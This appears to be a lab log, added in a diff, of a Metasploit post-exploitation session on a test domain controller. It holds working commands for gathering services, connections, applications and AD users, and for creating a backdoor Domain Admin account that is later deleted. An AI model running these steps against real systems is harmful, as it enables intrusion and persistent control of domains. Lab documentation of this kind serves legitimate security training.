+ ProfSvc                                    LocalSystem                  Auto      C:\Windows\system32\svchost.exe -k netsvcs -p
+ PushToInstall                              LocalSystem                  Disabled  C:\Windows\System32\svchost.exe -k netsvcs -p
+ QEMU Guest Agent VSS Provider              LocalSystem                  Manual    C:\Windows\system32\dllhost.exe /Processid:{4E1FA2FE-D7FE-4A45-BC29-BB8050B36199}
+ QEMU-GA                                    LocalSystem                  Auto      "C:\Program Files\Qemu-ga\qemu-ga.exe" -d --retry-path
+ QWAVE                                      NT AUTHORITY\LocalService    Manual    C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation -p
+ RSoPProv                                   LocalSystem                  Manual    C:\Windows\system32\RSoPProv.exe
+ RasAuto                                    localSystem                  Manual    C:\Windows\System32\svchost.exe -k netsvcs -p
+ RasMan                                     localSystem                  Auto      C:\Windows\System32\svchost.exe -k netsvcs
+ RemoteAccess                               localSystem                  Disabled  C:\Windows\System32\svchost.exe -k netsvcs
+ RemoteRegistry                             NT AUTHORITY\LocalService    Auto      C:\Windows\system32\svchost.exe -k localService -p
+ RmSvc                                      NT AUTHORITY\LocalService    Disabled  C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted
+ RpcEptMapper                               NT AUTHORITY\NetworkService  Auto      C:\Windows\system32\svchost.exe -k RPCSS -p
+ RpcLocator                                 NT AUTHORITY\NetworkService  Manual    C:\Windows\system32\locator.exe
+ RpcSs                                      NT AUTHORITY\NetworkService  Auto      C:\Windows\system32\svchost.exe -k rpcss -p
+ SCPolicySvc                                LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k netsvcs
+ SCardSvr                                   NT AUTHORITY\LocalService    Manual    C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation
+ SEMgrSvc                                   NT AUTHORITY\LocalService    Disabled  C:\Windows\system32\svchost.exe -k LocalService -p
+ SENS                                       LocalSystem                  Auto      C:\Windows\system32\svchost.exe -k netsvcs -p
+ SNMPTRAP                                   NT AUTHORITY\LocalService    Manual    C:\Windows\System32\snmptrap.exe
+ SSDPSRV                                    NT AUTHORITY\LocalService    Disabled  C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation -p
+ SamSs                                      LocalSystem                  Auto      C:\Windows\system32\lsass.exe
+ ScDeviceEnum                               LocalSystem                  Disabled  C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted
+ Schedule                                   LocalSystem                  Auto      C:\Windows\system32\svchost.exe -k netsvcs -p
+ SecurityHealthService                      LocalSystem                  Manual    C:\Windows\system32\SecurityHealthService.exe
+ Sense                                      LocalSystem                  Manual    "C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"
+ SensorDataService                          LocalSystem                  Disabled  C:\Windows\System32\SensorDataService.exe
+ SensorService                              LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p
+ SensrSvc                                   NT AUTHORITY\LocalService    Manual    C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation -p
+ SessionEnv                                 localSystem                  Manual    C:\Windows\System32\svchost.exe -k netsvcs -p
+ SharedAccess                               LocalSystem                  Disabled  C:\Windows\System32\svchost.exe -k netsvcs -p
+ ShellHWDetection                           LocalSystem                  Auto      C:\Windows\System32\svchost.exe -k netsvcs -p
+ Spooler                                    LocalSystem                  Auto      C:\Windows\System32\spoolsv.exe
+ SstpSvc                                    NT Authority\LocalService    Manual    C:\Windows\system32\svchost.exe -k LocalService -p
+ StateRepository                            LocalSystem                  Auto      C:\Windows\system32\svchost.exe -k appmodel -p
+ StiSvc                                     NT Authority\LocalService    Manual    C:\Windows\system32\svchost.exe -k imgsvc
+ StorSvc                                    LocalSystem                  Auto      C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
+ SysMain                                    LocalSystem                  Auto      C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p
+ SystemEventsBroker                         LocalSystem                  Auto      C:\Windows\system32\svchost.exe -k DcomLaunch -p
+ TabletInputService                         LocalSystem                  Manual    C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
+ TermService                                NT Authority\NetworkService  Manual    C:\Windows\System32\svchost.exe -k termsvcs
+ Themes                                     LocalSystem                  Auto      C:\Windows\System32\svchost.exe -k netsvcs -p
+ TieringEngineService                       localSystem                  Manual    C:\Windows\system32\TieringEngineService.exe
+ TimeBrokerSvc                              NT AUTHORITY\LocalService    Manual    C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p
+ TokenBroker                                LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k netsvcs -p
+ TrkWks                                     LocalSystem                  Manual    C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
+ TrustedInstaller                           localSystem                  Manual    C:\Windows\servicing\TrustedInstaller.exe
+ UALSVC                                     LocalSystem                  Auto      C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p
+ UdkUserSvc_35153ef                                                      Manual    C:\Windows\system32\svchost.exe -k UdkSvcGroup
+ UevAgentService                            LocalSystem                  Disabled  C:\Windows\system32\AgentService.exe
+ UmRdpService                               localSystem                  Manual    C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
+ UnistoreSvc_35153ef                                                     Manual    C:\Windows\System32\svchost.exe -k UnistackSvcGroup
+ UserDataSvc_35153ef                                                     Manual    C:\Windows\system32\svchost.exe -k UnistackSvcGroup
+ UserManager                                LocalSystem                  Auto      C:\Windows\system32\svchost.exe -k netsvcs -p
+ UsoSvc                                     LocalSystem                  Auto      C:\Windows\system32\svchost.exe -k netsvcs -p
+ VSS                                        LocalSystem                  Manual    C:\Windows\system32\vssvc.exe
+ VaultSvc                                   LocalSystem                  Manual    C:\Windows\system32\lsass.exe
+ W32Time                                    NT AUTHORITY\LocalService    Auto      C:\Windows\system32\svchost.exe -k LocalService
+ WEPHOSTSVC                                 NT AUTHORITY\LocalService    Manual    C:\Windows\system32\svchost.exe -k WepHostSvcGroup
+ WMPNetworkSvc                              NT AUTHORITY\NetworkService  Manual    "C:\Program Files\Windows Media Player\wmpnetwk.exe"
+ WPDBusEnum                                 LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted
+ WSearch                                    LocalSystem                  Disabled  C:\Windows\system32\SearchIndexer.exe /Embedding
+ WaaSMedicSvc                               LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k wusvcs -p
+ WalletService                              LocalSystem                  Disabled  C:\Windows\System32\svchost.exe -k appmodel -p
+ WarpJITSvc                                 NT Authority\LocalService    Manual    C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted
+ WbioSrvc                                   LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k WbioSvcGroup
+ Wcmsvc                                     NT Authority\LocalService    Auto      C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p
+ WdNisSvc                                   NT AUTHORITY\LocalService    Manual    "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25080.5-0\NisSrv.exe"
+ WdiServiceHost                             NT AUTHORITY\LocalService    Manual    C:\Windows\System32\svchost.exe -k LocalService -p
+ WdiSystemHost                              LocalSystem                  Manual    C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
+ Wecsvc                                     NT AUTHORITY\NetworkService  Manual    C:\Windows\system32\svchost.exe -k NetworkService -p
+ WerSvc                                     localSystem                  Manual    C:\Windows\System32\svchost.exe -k WerSvcGroup
+ WiaRpc                                     LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p
+ WinDefend                                  LocalSystem                  Auto      "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25080.5-0\MsMpEng.exe"
+ WinHttpAutoProxySvc                        NT AUTHORITY\LocalService    Manual    C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p
+ WinRM                                      NT AUTHORITY\NetworkService  Auto      C:\Windows\System32\svchost.exe -k NetworkService -p
+ Winmgmt                                    localSystem                  Auto      C:\Windows\system32\svchost.exe -k netsvcs -p
+ WpnService                                 LocalSystem                  Auto      C:\Windows\system32\svchost.exe -k netsvcs -p
+ WpnUserService_35153ef                                                  Auto      C:\Windows\system32\svchost.exe -k UnistackSvcGroup
+ bthserv                                    NT AUTHORITY\LocalService    Manual    C:\Windows\system32\svchost.exe -k LocalService -p
+ camsvc                                     LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k appmodel -p
+ cbdhsvc_35153ef                                                         Auto      C:\Windows\system32\svchost.exe -k ClipboardSvcGroup -p
+ dcsvc                                      LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k netsvcs -p
+ defragsvc                                  localSystem                  Manual    C:\Windows\system32\svchost.exe -k defragsvc
+ diagnosticshub.standardcollector.service   LocalSystem                  Manual    C:\Windows\system32\DiagSvcs\DiagnosticsHub.StandardCollector.Service.exe
+ dmwappushservice                           LocalSystem                  Disabled  C:\Windows\system32\svchost.exe -k netsvcs -p
+ dot3svc                                    localSystem                  Manual    C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p
+ edgeupdate                                 LocalSystem                  Auto      "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /svc
+ edgeupdatem                                LocalSystem                  Manual    "C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe" /medsvc
+ embeddedmode                               LocalSystem                  Manual    C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
+ fdPHost                                    NT AUTHORITY\LocalService    Manual    C:\Windows\system32\svchost.exe -k LocalService -p
+ gpsvc                                      LocalSystem                  Auto      C:\Windows\system32\svchost.exe -k netsvcs -p
+ hidserv                                    LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p
+ iphlpsvc                                   LocalSystem                  Auto      C:\Windows\System32\svchost.exe -k NetSvcs -p
+ lfsvc                                      LocalSystem                  Disabled  C:\Windows\system32\svchost.exe -k netsvcs -p
+ lltdsvc                                    NT AUTHORITY\LocalService    Disabled  C:\Windows\System32\svchost.exe -k LocalService -p
+ lmhosts                                    NT AUTHORITY\LocalService    Manual    C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p
+ mpssvc                                     NT Authority\LocalService    Auto      C:\Windows\system32\svchost.exe -k LocalServiceNoNetworkFirewall -p
+ msiserver                                  LocalSystem                  Manual    C:\Windows\system32\msiexec.exe /V
+ netprofm                                   NT AUTHORITY\LocalService    Manual    C:\Windows\System32\svchost.exe -k LocalService -p
+ nsi                                        NT Authority\LocalService    Auto      C:\Windows\system32\svchost.exe -k LocalService -p
+ pla                                        NT AUTHORITY\LocalService    Manual    C:\Windows\System32\svchost.exe -k LocalServiceNoNetwork -p
+ sacsvr                                     LocalSystem                  Manual    C:\Windows\System32\svchost.exe -k netsvcs -p
+ seclogon                                   LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k netsvcs -p
+ shpamsvc                                   LocalSystem                  Disabled  C:\Windows\System32\svchost.exe -k netsvcs -p
+ smphost                                    NT AUTHORITY\NetworkService  Manual    C:\Windows\System32\svchost.exe -k smphost
+ sppsvc                                     NT AUTHORITY\NetworkService  Auto      C:\Windows\system32\sppsvc.exe
+ ssh-agent                                  LocalSystem                  Disabled  C:\Windows\System32\OpenSSH\ssh-agent.exe
+ svsvc                                      LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p
+ swprv                                      LocalSystem                  Manual    C:\Windows\System32\svchost.exe -k swprv
+ tapisrv                                    NT AUTHORITY\NetworkService  Manual    C:\Windows\System32\svchost.exe -k NetworkService -p
+ tzautoupdate                               NT AUTHORITY\LocalService    Disabled  C:\Windows\system32\svchost.exe -k LocalService -p
+ upnphost                                   NT AUTHORITY\LocalService    Disabled  C:\Windows\system32\svchost.exe -k LocalServiceAndNoImpersonation -p
+ vds                                        LocalSystem                  Manual    C:\Windows\System32\vds.exe
+ vdservice                                  LocalSystem                  Auto      "C:\Program Files (x86)\SPICE Guest Tools\64\vdservice.exe"
+ vmicguestinterface                         LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p
+ vmicheartbeat                              LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k ICService -p
+ vmickvpexchange                            LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p
+ vmicshutdown                               LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p
+ vmictimesync                               NT AUTHORITY\LocalService    Manual    C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p
+ vmicvmsession                              LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p
+ vmicvss                                    LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p
+ wbengine                                   localSystem                  Manual    "C:\Windows\system32\wbengine.exe"
+ wercplsupport                              localSystem                  Manual    C:\Windows\System32\svchost.exe -k netsvcs -p
+ wisvc                                      LocalSystem                  Disabled  C:\Windows\system32\svchost.exe -k netsvcs -p
+ wlidsvc                                    LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k netsvcs -p
+ wmiApSrv                                   localSystem                  Manual    C:\Windows\system32\wbem\WmiApSrv.exe
+ wuauserv                                   LocalSystem                  Manual    C:\Windows\system32\svchost.exe -k netsvcs -p
+
+[+] Loot file stored in: /home/pt/.msf4/loot/20260131203211_default_192.168.250.250_windows.services_412709.txt
+[*] Post module execution completed
+
+---
+
+msf post(windows/gather/enum_services) > use post/windows/gather/tcpnetstat
+msf post(windows/gather/tcpnetstat) > set session 1
+session => 1
+msf post(windows/gather/tcpnetstat) > run
+[*] TCP Table Size: 812
+[*] Total TCP Entries: 30
+[*] Connection Table
+================
+
+  STATE        LHOST            LPORT  RHOST          RPORT
+  -----        -----            -----  -----          -----
+  ESTABLISHED  192.168.250.250  61116  192.168.0.120  4444
+  LISTEN       0.0.0.0          88     0.0.0.0        _
+  LISTEN       0.0.0.0          135    0.0.0.0        _
+  LISTEN       0.0.0.0          389    0.0.0.0        _
+  LISTEN       0.0.0.0          445    0.0.0.0        _
+  LISTEN       0.0.0.0          464    0.0.0.0        _
+  LISTEN       0.0.0.0          593    0.0.0.0        _
+  LISTEN       0.0.0.0          636    0.0.0.0        _
+  LISTEN       0.0.0.0          3268   0.0.0.0        _
+  LISTEN       0.0.0.0          3269   0.0.0.0        _
+  LISTEN       0.0.0.0          3389   0.0.0.0        _
+  LISTEN       0.0.0.0          5357   0.0.0.0        _
+  LISTEN       0.0.0.0          5985   0.0.0.0        _
+  LISTEN       0.0.0.0          9389   0.0.0.0        _
+  LISTEN       0.0.0.0          47001  0.0.0.0        _
+  LISTEN       0.0.0.0          49664  0.0.0.0        _
+  LISTEN       0.0.0.0          49665  0.0.0.0        _
+  LISTEN       0.0.0.0          49666  0.0.0.0        _
+  LISTEN       0.0.0.0          49667  0.0.0.0        _
+  LISTEN       0.0.0.0          49668  0.0.0.0        _
+  LISTEN       0.0.0.0          49669  0.0.0.0        _
+  LISTEN       0.0.0.0          53231  0.0.0.0        _
+  LISTEN       0.0.0.0          53232  0.0.0.0        _
+  LISTEN       0.0.0.0          53233  0.0.0.0        _
+  LISTEN       0.0.0.0          55449  0.0.0.0        _
+  LISTEN       0.0.0.0          55465  0.0.0.0        _
+  LISTEN       0.0.0.0          55469  0.0.0.0        _
+  LISTEN       127.0.0.1        53     0.0.0.0        _
+  LISTEN       192.168.250.250  53     0.0.0.0        _
+  LISTEN       192.168.250.250  139    0.0.0.0        _
+
+[*] Post module execution completed
+
+---
+
+msf post(windows/gather/enum_applications) > use post/windows/gather/enum_applications
+msf post(windows/gather/enum_applications) > set session 1
+session => 1
+msf post(windows/gather/enum_applications) > run
+[*] Enumerating applications installed on CNT-ADC-1
+
+Installed Applications
+======================
+
+ Name                     Version
+ ----                     -------
+ Microsoft Edge           143.0.3650.80
+ Microsoft Edge           143.0.3650.80
+ SPICE Guest Tools 0.141  0.141
+ SPICE Guest Tools 0.141  0.141
+
+
+[+] Results stored in: /home/pt/.msf4/loot/20260131204559_default_192.168.250.250_host.application_044274.txt
+[*] Post module execution completed
+msf post(windows/gather/enum_applications) >
+
+---
+
+msf post(windows/gather/enum_termserv) > use post/windows/gather/enum_termserv
+msf post(windows/gather/enum_termserv) > set session 1
+session => 1
+msf post(windows/gather/enum_termserv) > run
+[*] Doing enumeration for S-1-5-21-2495299273-1550643078-88650105-500
+[*] Doing enumeration for S-1-5-21-4240677063-2458479951-783602691-500
+[+] Systems connected to:
+[+] Server list and user hints:
+[+] cnt-srv-1.contoso.lab is connected to as CONTOSO\Administrator
+[+] cnt-wks-1.contoso.lab is connected to as CONTOSO\Administrator
+[*] Post module execution completed
+
+---
+
+msf post(windows/manage/add_user) > use post/windows/manage/add_user
+msf post(windows/manage/add_user) > set addtodomain true
+addtodomain => true
+msf post(windows/manage/add_user) > set addtogroup true
+addtogroup => true
+msf post(windows/manage/add_user) > set username cool_hacker
+username => cool_hacker
+msf post(windows/manage/add_user) > set password P@ssw0rd
+password => P@ssw0rd
+msf post(windows/manage/add_user) > set group "Domain Admins"
+group => Domain Admins
+msf post(windows/manage/add_user) > run
+[*] Running module on CNT-ADC-1 (192.168.250.250)
+[*] Domain Mode
+[+] Found Domain : \\cnt-adc-1.contoso.lab
+[+] Found Domain Admin Token: 1 - 192.168.250.250 - Administrator (Current User)
+[*] Adding 'cool_hacker' as a user to the CONTOSO domain
+[+] User 'cool_hacker' was added to the CONTOSO domain.
+[*] Adding 'cool_hacker' to the 'Domain Admins' Domain Group
+[+] 'cool_hacker' is now a member of the 'Domain Admins' group!
+[*] Post module execution completed
+msf post(windows/manage/add_user) > use post/windows/gather/enum_ad_users
+msf post(windows/gather/enum_ad_users) > set session 1
+session => 1
+msf post(windows/gather/enum_ad_users) > run
+Domain Users
+============
+
+ sAMAccountName  name           userPrincipalName    userAccountControl  lockoutTime  mail  primarygroupid  description
+ --------------  ----           -----------------    ------------------  -----------  ----  --------------  -----------
+ Administrator   Administrator                       66048                                  513             Built-in account for administering the computer/domain
+ Guest           Guest                               66082                                  514             Built-in account for guest access to the computer/domain
+ krbtgt          krbtgt                              514                                    513             Key Distribution Center Service Account
+ user            user           user@contoso.lab     66048                                  513             Contoso Domain User
+ userSAN         userSAN        usersan@contoso.lab  66048                                  513             Contoso SAN Spoof Proxy User
+ cool_hacker     cool_hacker                         66048                                  513
+
+[*] Post module execution completed
+msf post(windows/gather/enum_ad_users) >  use post/windows/manage/delete_user
+msf post(windows/manage/delete_user) > set username cool_hacker
+username => cool_hacker
+msf post(windows/manage/delete_user) > set session 1
+session => 1
+msf post(windows/manage/delete_user) > run
+[*] User was deleted!
+[*] Post module execution completed
+msf post(windows/manage/delete_user) > use post/windows/gather/enum_ad_users
+msf post(windows/gather/enum_ad_users) > set session 1
+session => 1
+msf post(windows/gather/enum_ad_users) > run
+Domain Users
+============
+
+ sAMAccountName  name           userPrincipalName    userAccountControl  lockoutTime  mail  primarygroupid  description
+ --------------  ----           -----------------    ------------------  -----------  ----  --------------  -----------
+ Administrator   Administrator                       66048                                  513             Built-in account for administering the computer/domain
+ Guest           Guest                               66082                                  514             Built-in account for guest access to the computer/domain
+ krbtgt          krbtgt                              514                                    513             Key Distribution Center Service Account
+ user            user           user@contoso.lab     66048                                  513             Contoso Domain User
+ userSAN         userSAN        usersan@contoso.lab  66048                                  513             Contoso SAN Spoof Proxy User
+
+[*] Post module execution completed
+msf post(windows/gather/enum_ad_users) > 
+
+
